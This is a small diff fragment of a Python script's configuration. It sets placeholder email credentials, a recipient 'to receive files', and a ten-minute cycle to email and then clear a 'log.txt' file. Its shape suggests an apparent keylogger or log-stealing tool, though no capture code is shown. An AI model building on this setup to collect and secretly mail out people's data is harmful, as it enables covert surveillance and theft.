@@ -10,9 +10,9 @@ from email.mime.application import MIMEApplication # For File Attachment
 
 
 # Email information.
-EMAILID = "EMAIL"
-EMAILPASS = "PASS"
-TOEMAIL = "EMAIL TO RECEIVE FILES"
+EMAILID = "EMAIL" # REPLACE
+EMAILPASS = "PASS" # REPLACE
+TOEMAIL = "EMAIL TO RECEIVE FILES" # REPLACE
 
 CYCLE = 10 * 60 # Time interval to Email and Clean Logs. (10 Minutes)
 FILENAME = "log.txt" # Filename.
